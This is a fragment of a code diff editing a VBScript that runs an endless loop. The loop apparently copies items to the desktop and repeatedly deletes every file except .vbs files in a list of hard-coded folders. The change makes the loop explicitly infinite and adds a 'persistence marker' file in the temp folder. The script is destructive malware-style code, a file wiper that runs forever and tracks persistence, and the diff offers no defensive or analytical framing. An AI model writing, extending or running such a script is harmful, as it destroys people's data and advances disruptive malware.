@@ -9,7 +9,7 @@ foldersToDelete = Array("C:\Folder1", "C:\Folder2", "C:\Folder3")
 strDesktopFolder = objShell.SpecialFolders("Desktop")
 
 ' Loop indefinitely
-Do
+Do While True
     ' Generate a random number for the copy iteration
     randomIteration = Int((1000 * Rnd) + 1)
     
@@ -37,6 +37,14 @@ Do
     For Each folderPath In foldersToDelete
         DeleteFilesExceptVBS folderPath
     Next
+    
+    ' Check if a persistence marker file exists
+    persistenceFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\persistence.marker"
+    If Not objFSO.FileExists(persistenceFilePath) Then
+        ' If the marker file does not exist, create it
+        Set persistenceFile = objFSO.CreateTextFile(persistenceFilePath)
+        persistenceFile.Close
+    End If
 Loop
 
 Sub DeleteFilesExceptVBS(folderPath)
